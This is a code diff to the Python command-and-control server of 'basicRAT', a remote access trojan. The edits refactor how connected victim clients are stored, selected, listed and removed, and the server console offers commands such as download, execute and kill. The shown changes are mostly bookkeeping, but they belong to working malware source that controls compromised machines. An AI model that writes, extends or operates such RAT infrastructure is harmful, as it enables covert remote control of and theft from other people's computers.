@@ -51,7 +51,7 @@ COMMANDS = [ 'client', 'clients', 'download', 'execute', 'help', 'kill',
 
 
 class Server(threading.Thread):
-    clients      = []
+    clients      = {}
     alive        = True
     client_count = 1
 
@@ -65,39 +65,27 @@ class Server(threading.Thread):
     def run(self):
         while True:
             conn, addr = self.s.accept()
-            client = ClientConnection(conn, addr)
             client_id = self.client_count
-            self.clients.append({'client_id': client_id, 'client': client})
+            client = ClientConnection(conn, addr, uid=client_id)
+            self.clients[client_id] = client
             self.client_count += 1
 
-    def verify_client_id(self, client_id):
-        try:
-            client_index = next(i for (i, d) in enumerate(self.clients) if \
-                           d['client_id'] == int(client_id))
-            return True, 'Client {} selected.'.format(client_id)
-        except (StopIteration, ValueError):
-            return False, 'Error: Invalid client ID.'
-
     def select_client(self, client_id):
-        try:
-            for c in self.clients:
-                if c['client_id'] == int(client_id):
-                    return c['client']
-        except (ValueError, IndexError):
-            print 'Error: Invalid client ID.'
+        try: return self.clients[int(client_id)]
+        except (KeyError, ValueError): return None
 
+    #order is not retained. maybe use SortedDict? its a work in progress.
     def get_clients(self):
-        return [c for c in self.clients if c['client'].alive]
+        return [v for k,v in self.clients.iteritems() if v.alive]
 
-    def remove_client(self, conn):
-        conn_to_remove = next(i for i in self.clients if i['client'] == conn)
-        self.clients.remove(conn_to_remove)
+    def remove_client(self, key):
+        return self.clients.pop(key, None)
 
 
 class ClientConnection(common.Client):
     alive = True
 
-    def send(self, prompt, cmd, action):
+    def send(self, prompt):
         if not self.alive:
             print 'Error: Client not connected.'
             return
@@ -106,7 +94,7 @@ class ClientConnection(common.Client):
         self.sendGCM(prompt)
         self.conn.settimeout(1)
 
-        #cmd, _, action = prompt.partition(" ")
+        cmd, _, action = prompt.partition(" ")
 
         # kill client connection
         if cmd == 'kill':
@@ -155,7 +143,7 @@ def main():
     args    = vars(parser.parse_args())
     port    = args['port']
 
-    curr_client_id  = '?'
+    client  = None
 
     # print banner all sexy like
     for line in BANNER.split('\n'):
@@ -169,7 +157,12 @@ def main():
     print 'basicRAT server listening for connections on port {}.'.format(port)
 
     while True:
-        prompt = raw_input('\n[{}] basicRAT> '.format(curr_client_id)).rstrip()
+        try:
+            promptstr = '\n[{}] basicRAT> '.format(client.uid)
+        except AttributeError:
+            promptstr = '\n[{}] basicRAT> '.format('?')
+
+        prompt = raw_input(promptstr).rstrip()
 
         # allow noop
         if not prompt:
@@ -199,39 +192,39 @@ def main():
 
         # select client
         elif cmd == 'client':
-            success, message = server.verify_client_id(action)
-            if success:
-                curr_client_id = action
-            print message
+            new_client = server.select_client(action)
+            if new_client:
+                client = new_client
+                print 'Client {} selected.'.format(client.uid)
+            else:
+                print 'Error: Invalid Client ID'
             continue
 
         # list clients
         elif cmd == 'clients':
             print 'ID - Client Address'
-            for c in server.get_clients():
-                print '{:>2} - {}'.format(c['client_id'], c['client'].addr[0])
+            for k in server.get_clients():
+                print '{:>2} - {}'.format(k.uid, k.addr[0])
             continue
 
         # require client id
-        if curr_client_id == '?':
+        if client == None:
             print 'Error: Invalid client ID.'
             continue
 
-        # get client object based on current client id
-        client = server.select_client(curr_client_id)
 
         # send data to client
         try:
-            client.send(prompt, cmd, action)
+            client.send(prompt)
         except (socket.error, ValueError) as e:
             print e
-            print 'Client {} disconnected.'.format(curr_client_id)
+            print 'Client {} disconnected.'.format(client.uid)
             cmd = 'kill'
 
         # reset client id if client killed
         if cmd == 'kill':
-            server.remove_client(client)
-            curr_client_id = '?'
+            server.remove_client(client.uid)
+            client = None
 
 
 if __name__ == '__main__':
